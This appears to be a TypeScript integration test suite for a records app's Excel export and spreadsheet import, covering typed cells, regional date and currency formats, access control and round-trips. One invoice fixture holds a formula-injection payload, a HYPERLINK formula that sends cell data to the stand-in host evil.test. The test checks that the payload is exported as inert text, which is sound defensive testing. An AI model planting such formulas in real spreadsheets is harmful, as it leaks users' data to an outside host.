import {
    IMPORT_MATCH_BY_ID,
    importCsvRunSchema,
    jsonbKeyForField,
    openXlsx,
    readXlsxPart,
    tableToCsv,
    xlsxSheetToImportTable,
    type Field,
    type XlsxCell,
} from '@imagina-base/shared';
import { eq } from 'drizzle-orm';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { ActivityRepository } from '../src/activity/activity.repository';
import { ActivityService } from '../src/activity/activity.service';
import { AuditService } from '../src/audit/audit.service';
import { AutomationDispatcher } from '../src/automations/automation-dispatcher.service';
import { BillingService } from '../src/billing/billing.service';
import { PlansService } from '../src/billing/plans.service';
import { loadEnv } from '../src/config/env';
import { memberships, records, tenants, users } from '../src/db/schema';
import { withTenant } from '../src/db/tenant-tx';
import { ExportService } from '../src/export/export.service';
import { FieldsRepository } from '../src/fields/fields.repository';
import { FieldsService } from '../src/fields/fields.service';
import { ImportUpdateService } from '../src/import/import-update.service';
import { ImportService } from '../src/import/import.service';
import { ListsRepository } from '../src/lists/lists.repository';
import { ListsService } from '../src/lists/lists.service';
import { EmailQuotaService } from '../src/mail/email-quota.service';
import { TenantSmtpService } from '../src/mail/tenant-smtp.service';
import { RealtimeService } from '../src/realtime/realtime.service';
import { BulkHistoryService } from '../src/records/bulk-history.service';
import { RecordsRepository } from '../src/records/records.repository';
import { RecordsService, type Actor } from '../src/records/records.service';
import { RelationsRepository } from '../src/records/relations.repository';
import { TenantDb } from '../src/tenancy/tenant-db.service';
import { ViewsRepository } from '../src/views/views.repository';
import { ViewsService } from '../src/views/views.service';
import { startPostgres, type TestPg } from './helpers/containers';

const rt = new RealtimeService();
const admin: Actor = { userId: 0, role: 'admin' };

/** v0.1.299 — Excel: export con tipos reales y el import de planillas. */
describe('Excel (.xlsx): export de la vista e import de planillas', () => {
    let pg: TestPg;
    let lists_: ListsService;
    let fields_: FieldsService;
    let recs: RecordsService;
    let exporter: ExportService;
    let importer: ImportService;
    let updater: ImportUpdateService;
    let tenantId: number;
    let anaId: number;
    const f: Record<string, Field> = {};

    /** Exporta y devuelve los bytes + el nombre que se mandaría. */
    async function exportXlsx(
        actor: Actor,
        list: string,
        opts: Partial<Parameters<ExportService['streamXlsxExport']>[3]> = {},
    ): Promise<{ bytes: Uint8Array; ascii: string; display: string; rows: number }> {
        const chunks: Uint8Array[] = [];
        let ascii = '';
        let display = '';
        const { rows } = await exporter.streamXlsxExport(
            tenantId,
            actor,
            list,
            { fieldIds: [], ...opts },
            (a, d) => {
                ascii = a;
                display = d;
            },
            (c) => {
                chunks.push(c);
            },
        );
        const bytes = new Uint8Array(chunks.reduce((n, c) => n + c.length, 0));
        let o = 0;
        for (const c of chunks) {
            bytes.set(c, o);
            o += c.length;
        }
        return { bytes, ascii, display, rows };
    }

    beforeAll(async () => {
        pg = await startPostgres();
        const tenantDb = new TenantDb(pg.db);
        lists_ = new ListsService(tenantDb, new ListsRepository(), rt);
        fields_ = new FieldsService(tenantDb, new FieldsRepository(), lists_, rt);
        recs = new RecordsService(
            tenantDb,
            new RecordsRepository(),
            lists_,
            fields_,
            rt,
            new ActivityService(tenantDb, new ActivityRepository(), lists_),
            new AutomationDispatcher(),
            new RelationsRepository(),
        );
        exporter = new ExportService(tenantDb, lists_, fields_, new ViewsService(tenantDb, new ViewsRepository(), lists_, rt), recs);
        const plans = new PlansService(pg.db);
        const billing = new BillingService(
            tenantDb,
            plans,
            new EmailQuotaService(pg.db, plans),
            new TenantSmtpService(pg.db, loadEnv({ SECRETS_KEY: 'clave-de-test-32-bytes-o-lo-que-sea' })),
        );
        importer = new ImportService(tenantDb, lists_, fields_, new RecordsRepository(), billing, rt);
        updater = new ImportUpdateService(
            tenantDb,
            lists_,
            recs,
            importer,
            new BulkHistoryService(tenantDb, lists_, recs, rt, new AuditService(tenantDb)),
            rt,
        );

        // Formato regional de Colombia: punto de miles, día/mes, 24 h, Bogotá.
        const [t] = await pg.db
            .insert(tenants)
            .values({
                slug: 'acme',
                name: 'ACME',
                plan: 'enterprise',
                settings: { format: { number_format: 'dot_comma', date_format: 'dmy', time_format: 'h24', timezone: 'America/Bogota' } },
            })
            .returning();
        tenantId = t!.id;
        const [u] = await pg.db.insert(users).values({ email: 'admin@acme.co', name: 'Admin', passwordHash: 'x' }).returning();
        admin.userId = u!.id;
        const [ana] = await pg.db.insert(users).values({ email: 'ana@acme.co', name: 'Ana Pérez', passwordHash: 'x' }).returning();
        anaId = ana!.id;
        await withTenant(pg.db, tenantId, (tx) =>
            tx.insert(memberships).values([
                { userId: admin.userId, tenantId, role: 'admin' },
                { userId: anaId, tenantId, role: 'agent' },
            ]),
        );

        await lists_.create(tenantId, { name: 'Clientes' });
        await lists_.create(tenantId, { name: 'Facturas' });
        const clientes = await lists_.get(tenantId, 'clientes');
        const mk = async (list: string, slug: string, label: string, type: string, config: Record<string, unknown> = {}) => {
            f[slug] = await fields_.create(tenantId, list, { label, type, slug, config } as never);
        };
        await mk('clientes', 'nombre', 'Nombre', 'text');
        await mk('clientes', 'ciudad', 'Ciudad', 'text');
        await mk('facturas', 'numero', 'Número', 'text');
        await mk('facturas', 'monto', 'Monto', 'currency', { currency: 'COP', precision: 0 });
        await mk('facturas', 'avance', 'Avance', 'percent');
        await mk('facturas', 'horas', 'Horas', 'duration');
        await mk('facturas', 'vence', 'Vence', 'date');
        await mk('facturas', 'emitida', 'Emitida', 'datetime');
        await mk('facturas', 'estado', 'Estado', 'select', {
            options: [{ value: 'pendiente_pago', label: 'Pendiente de pago' }, { value: 'pagada', label: 'Pagada' }],
        });
        await mk('facturas', 'tags', 'Tags', 'multi_select', { options: [{ value: 'vip', label: 'VIP' }, { value: 'promo', label: 'Promo' }] });
        await mk('facturas', 'ok', 'Revisada', 'checkbox');
        await mk('facturas', 'resp', 'Responsable', 'user');
        await mk('facturas', 'tel', 'Teléfono', 'phone');
        await mk('facturas', 'web', 'Web', 'url');
        await mk('facturas', 'nota', 'Nota', 'long_text');
        await mk('facturas', 'cliente', 'Cliente', 'relation', { target_list_id: clientes.id });
        await mk('facturas', 'ciudad_cli', 'Ciudad del cliente', 'lookup', { relation_field_id: f.cliente!.id, target_field_id: f.ciudad!.id });
        await mk('clientes', 'facturado', 'Facturado', 'rollup', { relation_field_id: f.cliente!.id, target_field_id: f.monto!.id, operation: 'sum' });

        const acme = await recs.create(tenantId, admin, 'clientes', { data: { [`f${f.nombre!.id}`]: 'Acme S.A.', [`f${f.ciudad!.id}`]: 'Bogotá' } });
        await recs.create(tenantId, admin, 'facturas', {
            data: {
                [`f${f.numero!.id}`]: '=HYPERLINK("http://evil.test/?d="&A2,"Ver")',
                [`f${f.monto!.id}`]: 1250000,
                [`f${f.avance!.id}`]: 75,
                [`f${f.horas!.id}`]: 90,
                [`f${f.vence!.id}`]: '2026-07-30',
                // 19:30 UTC = 14:30 en Bogotá.
                [`f${f.emitida!.id}`]: '2026-07-30T19:30:00.000Z',
                [`f${f.estado!.id}`]: 'pendiente_pago',
                [`f${f.tags!.id}`]: ['vip', 'promo'],
                [`f${f.ok!.id}`]: true,
                [`f${f.resp!.id}`]: anaId,
                [`f${f.tel!.id}`]: '+573001112233',
                [`f${f.web!.id}`]: 'https://acme.co/f/1?a=1&b=2',
                [`f${f.nota!.id}`]: 'Línea 1\nLínea 2',
                [`f${f.cliente!.id}`]: [acme.id],
            },
        });
        await recs.create(tenantId, admin, 'facturas', {
            data: { [`f${f.numero!.id}`]: 'F-2', [`f${f.monto!.id}`]: 350000, [`f${f.estado!.id}`]: 'pagada' },
        });
    });

    afterAll(async () => {
        await pg?.stop();
    });

    it('cada celda con su tipo real, en la zona y con las etiquetas de la empresa', async () => {
        const out = await exportXlsx(admin, 'facturas', { sheetName: 'Por cobrar: julio/2026' });
        expect(out.rows).toBe(2);
        expect(out.ascii).toBe('facturas.xlsx');
        expect(out.display).toBe('Facturas - Por cobrar julio 2026.xlsx');

        const book = openXlsx(out.bytes);
        expect(book.sheets.map((s) => s.name)).toEqual(['Por cobrar julio 2026']);
        const sheet = book.readSheet(0);
        const head = sheet.rows[0]!.cells.map((c) => (c as { v: unknown }).v);
        expect(head).toEqual([
            'Número', 'Monto', 'Avance', 'Horas', 'Vence', 'Emitida', 'Estado', 'Tags', 'Revisada', 'Responsable',
            'Teléfono', 'Web', 'Nota', 'Cliente', 'Ciudad del cliente',
        ]);
        const row = sheet.rows[1]!.cells;
        const at = (label: string): XlsxCell | null => row[head.indexOf(label)] ?? null;
        // Texto que parece fórmula: TEXTO (nunca se evalúa).
        expect(at('Número')).toEqual({ t: 'str', v: '=HYPERLINK("http://evil.test/?d="&A2,"Ver")' });
        expect(at('Monto')).toEqual({ t: 'num', v: 1250000, kind: 'currency' });
        expect(at('Avance')).toEqual({ t: 'num', v: 0.75, kind: 'percent' });
        expect(at('Horas')).toMatchObject({ t: 'num', kind: 'elapsed' });
        expect((at('Horas') as { v: number }).v * 1440).toBeCloseTo(90, 6);
        expect(at('Vence')).toEqual({ t: 'date', v: { y: 2026, m: 7, d: 30, h: 0, mi: 0, s: 0 }, time: false });
        expect(at('Emitida')).toEqual({ t: 'date', v: { y: 2026, m: 7, d: 30, h: 14, mi: 30, s: 0 }, time: true });
        expect(at('Estado')).toEqual({ t: 'str', v: 'Pendiente de pago' });
        expect(at('Tags')).toEqual({ t: 'str', v: 'VIP, Promo' });
        expect(at('Revisada')).toEqual({ t: 'str', v: 'Sí' });
        expect(at('Responsable')).toEqual({ t: 'str', v: 'Ana Pérez' });
        expect(at('Teléfono')).toEqual({ t: 'str', v: '+573001112233' });
        expect(at('Nota')).toEqual({ t: 'str', v: 'Línea 1\nLínea 2' });
        expect(at('Cliente')).toEqual({ t: 'str', v: 'Acme S.A.' });
        expect(at('Ciudad del cliente')).toEqual({ t: 'str', v: 'Bogotá' });

        const part = (p: string): string => readXlsxPart(out.bytes, p) ?? '';
        const xml = part('xl/worksheets/sheet1.xml');
        expect(xml).not.toContain('<f>');
        expect(xml).toContain('state="frozen"');
        expect(xml).toContain('<autoFilter ref="A1:O3"/>');
        const styles = part('xl/styles.xml');
        // Fecha en el orden de la empresa, hora de 24 h y la moneda con su símbolo y sin decimales.
        expect(styles).toContain('formatCode="dd/mm/yyyy"');
        expect(styles).toContain('formatCode="dd/mm/yyyy hh:mm"');
        expect(styles).toMatch(/formatCode="&quot;\$ ?&quot;#,##0"/);
        expect(styles).toContain('formatCode="[h]:mm"');
        // El enlace de la web, clickeable.
        expect(part('xl/worksheets/_rels/sheet1.xml.rels')).toContain('Target="https://acme.co/f/1?a=1&amp;b=2"');

        // El rollup del otro lado: un NÚMERO con la moneda del campo sumado.
        const cl = openXlsx((await exportXlsx(admin, 'clientes')).bytes).readSheet(0);
        expect(cl.rows[1]!.cells).toEqual([{ t: 'str', v: 'Acme S.A.' }, { t: 'str', v: 'Bogotá' }, { t: 'num', v: 1250000, kind: 'currency' }]);
    });

    it('columnas elegidas en su orden, ID opcional y columnas fijas', async () => {
        const out = await exportXlsx(admin, 'facturas', {
            fieldIds: [f.estado!.id, f.numero!.id, f.monto!.id],
            withId: true,
            freezeColumns: 1,
        });
        const sheet = openXlsx(out.bytes).readSheet(0);
        expect(sheet.rows[0]!.cells.map((c) => (c as { v: unknown }).v)).toEqual(['ID', 'Estado', 'Número', 'Monto']);
        expect(sheet.rows[2]!.cells[1]).toEqual({ t: 'str', v: 'Pagada' });
        // ID + la primera columna de la vista quedan fijas.
        expect(readXlsxPart(out.bytes, 'xl/worksheets/sheet1.xml')).toContain('<pane xSplit="2" ySplit="1" topLeftCell="C2"');
    });

    it('respeta el ACL: lo que el rol no ve no sale ni como columna; el alcance «lo suyo» acota las filas', async () => {
        await lists_.updatePermissions(tenantId, 'facturas', {
            permissions: { agent: { view: 'own', create: true, edit: 'own', delete: 'none', fields_hidden: ['monto'] } },
        });
        const agent: Actor = { userId: anaId, role: 'agent' };
        await recs.create(tenantId, agent, 'facturas', { data: { [`f${f.numero!.id}`]: 'F-ANA', [`f${f.monto!.id}`]: 10 } });
        const sheet = openXlsx((await exportXlsx(agent, 'facturas')).bytes).readSheet(0);
        const head = sheet.rows[0]!.cells.map((c) => (c as { v: unknown }).v);
        expect(head).not.toContain('Monto');
        expect(sheet.rows).toHaveLength(2);
        expect(sheet.rows[1]!.cells[0]).toEqual({ t: 'str', v: 'F-ANA' });
        await lists_.updatePermissions(tenantId, 'facturas', { permissions: {} });
    });

    it('subtareas: con ID y «Subtarea de» (se re-importan) y sangradas; o sólo el primer nivel', async () => {
        await lists_.create(tenantId, { name: 'Tareas' });
        const titulo = await fields_.create(tenantId, 'tareas', { label: 'Título', type: 'text', slug: 'titulo' });
        const padre = await recs.create(tenantId, admin, 'tareas', { data: { [`f${titulo.id}`]: 'Mudanza' } });
        const hija = await recs.create(tenantId, admin, 'tareas', { data: { [`f${titulo.id}`]: 'Embalar' }, parent_id: padre.id });

        const out = await exportXlsx(admin, 'tareas');
        const sheet = openXlsx(out.bytes).readSheet(0);
        expect(sheet.rows.map((r) => r.cells)).toEqual([
            [{ t: 'str', v: 'ID' }, { t: 'str', v: 'Subtarea de' }, { t: 'str', v: 'Título' }],
            [{ t: 'num', v: padre.id, kind: 'general' }, null, { t: 'str', v: 'Mudanza' }],
            [{ t: 'num', v: hija.id, kind: 'general' }, { t: 'num', v: padre.id, kind: 'general' }, { t: 'str', v: 'Embalar' }],
        ]);
        const xml = readXlsxPart(out.bytes, 'xl/worksheets/sheet1.xml') ?? '';
        const styles = readXlsxPart(out.bytes, 'xl/styles.xml') ?? '';
        const embalar = /<c r="C3" t="inlineStr" s="(\d+)">/.exec(xml);
        expect(embalar).not.toBeNull();
        const xfs = [...styles.matchAll(/<xf [^>]*?(?:\/>|>.*?<\/xf>)/g)].map((m) => m[0]).slice(1); // sin el de cellStyleXfs
        expect(xfs[Number(embalar![1])]).toContain('indent="2"');

        const roots = openXlsx((await exportXlsx(admin, 'tareas', { includeSubtasks: false })).bytes).readSheet(0);
        expect(roots.rows.map((r) => r.cells)).toEqual([[{ t: 'str', v: 'Título' }], [{ t: 'str', v: 'Mudanza' }]]);
    });

    it('una vista más grande que el tope se rechaza ANTES de empezar, con la salida', async () => {
        let started = false;
        await expect(
            exporter.streamXlsxExport(tenantId, admin, 'facturas', { fieldIds: [], maxRows: 2 }, () => {
                started = true;
            }, () => undefined),
        ).rejects.toThrow(/Filtra la vista o exporta en CSV/);
        expect(started).toBe(false);
    });

    it('ida y vuelta: exportar y volver a cargar el mismo archivo no cambia nada', async () => {
        const out = await exportXlsx(admin, 'facturas', {
            withId: true,
            fieldIds: [f.monto!.id, f.avance!.id, f.horas!.id, f.vence!.id, f.emitida!.id, f.estado!.id, f.tags!.id, f.ok!.id, f.resp!.id, f.tel!.id],
        });
        const table = xlsxSheetToImportTable(openXlsx(out.bytes).readSheet(0), { decimalSeparator: ',', maxRows: 5000 });
        const csv = tableToCsv(table.headers, table.rows);
        const mapping: Record<string, string> = {};
        table.headers.forEach((h, i) => {
            const field = Object.values(f).find((x) => x.label === h && x.list_id === f.monto!.list_id);
            if (field) mapping[String(i)] = field.slug;
        });
        const preview = await updater.preview(tenantId, admin, 'facturas', {
            csv,
            mapping,
            match: { column_index: 0, by: IMPORT_MATCH_BY_ID },
            mode: 'update',
            clear_empty: false,
            row_offset: 0,
            source: 'xlsx',
        });
        expect(preview.error_count).toBe(0);
        expect(preview.matched).toBe(3);
        // Montos, %, duración, fecha, fecha y hora en Bogotá, opciones, persona y teléfono: iguales.
        expect(preview.changed).toBe(0);
        expect(preview.unchanged).toBe(3);
    });

    it('import de una planilla: lee con el formato y la zona de la empresa, y crea campos con el tipo de las celdas', async () => {
        const out = await exportXlsx(admin, 'facturas', {
            fieldIds: [f.numero!.id, f.monto!.id, f.avance!.id, f.horas!.id, f.emitida!.id, f.tel!.id],
        });
        const table = xlsxSheetToImportTable(openXlsx(out.bytes).readSheet(0), { decimalSeparator: ',', maxRows: 5000 });
        expect(table.typeHints).toMatchObject({ 1: 'currency', 2: 'percent', 3: 'duration', 4: 'datetime' });
        await lists_.create(tenantId, { name: 'Copia' });
        const types = ['text', 'currency', 'percent', 'duration', 'datetime', 'phone'] as const;
        const input = importCsvRunSchema.parse({
            csv: tableToCsv(table.headers, table.rows),
            mapping: {},
            new_fields: table.headers.map((label, i) => ({ csv_column_index: i, label, type: types[i] })),
            source: 'xlsx',
        });
        const res = await importer.runCsv(tenantId, admin, 'copia', input);
        expect(res.errors).toEqual([]);
        expect(res.imported).toBe(3);
        const copia = await fields_.list(tenantId, 'copia');
        const by = (label: string) => jsonbKeyForField(copia.find((x) => x.label === label)!.id);
        const rows = await withTenant(pg.db, tenantId, (tx) => tx.select({ data: records.data }).from(records).where(eq(records.listId, copia[0]!.list_id)));
        const first = rows.map((r) => r.data as Record<string, unknown>).find((d) => typeof d[by('Número')] === 'string' && String(d[by('Número')]).startsWith('=HYPERLINK'))!;
        expect(first[by('Monto')]).toBe(1250000);
        expect(first[by('Avance')]).toBe(75);
        expect(first[by('Horas')]).toBe(90);
        expect(new Date(String(first[by('Emitida')])).toISOString()).toBe('2026-07-30T19:30:00.000Z');
        expect(first[by('Teléfono')]).toBe('+573001112233');
    });

    it('`source: xlsx` lee los números con el decimal de la empresa; el CSV conserva la lectura de siempre', async () => {
        await pg.db
            .update(tenants)
            .set({ settings: { format: { number_format: 'comma_dot', date_format: 'ymd', time_format: 'h24', timezone: 'America/Bogota' } } })
            .where(eq(tenants.id, tenantId));
        await lists_.create(tenantId, { name: 'Medidas' });
        const valor = await fields_.create(tenantId, 'medidas', { label: 'Valor', type: 'number', slug: 'valor', config: { precision: 3 } });
        const cuando = await fields_.create(tenantId, 'medidas', { label: 'Cuando', type: 'datetime', slug: 'cuando' });
        const csv = 'Valor,Cuando\r\n1.234,2026-07-30 14:30\r\n';
        const mapping = { 0: 'valor', 1: 'cuando' };
        await importer.runCsv(tenantId, admin, 'medidas', importCsvRunSchema.parse({ csv, mapping, source: 'xlsx' }));
        await importer.runCsv(tenantId, admin, 'medidas', importCsvRunSchema.parse({ csv, mapping }));
        const rows = await withTenant(pg.db, tenantId, (tx) =>
            tx.select({ data: records.data }).from(records).where(eq(records.listId, valor.list_id)).orderBy(records.id),
        );
        const [fromXlsx, fromCsv] = rows.map((r) => r.data as Record<string, unknown>);
        // Planilla: 1.234 es uno coma doscientos treinta y cuatro (decimal de la empresa).
        expect(fromXlsx![`f${valor.id}`]).toBe(1.234);
        // 14:30 en Bogotá.
        expect(fromXlsx![`f${cuando.id}`]).toBe('2026-07-30T19:30:00.000Z');
        // CSV de siempre: punto con tres dígitos = miles; hora sin zona = UTC.
        expect(fromCsv![`f${valor.id}`]).toBe(1234);
        expect(fromCsv![`f${cuando.id}`]).toBe('2026-07-30T14:30:00.000Z');
    });
});
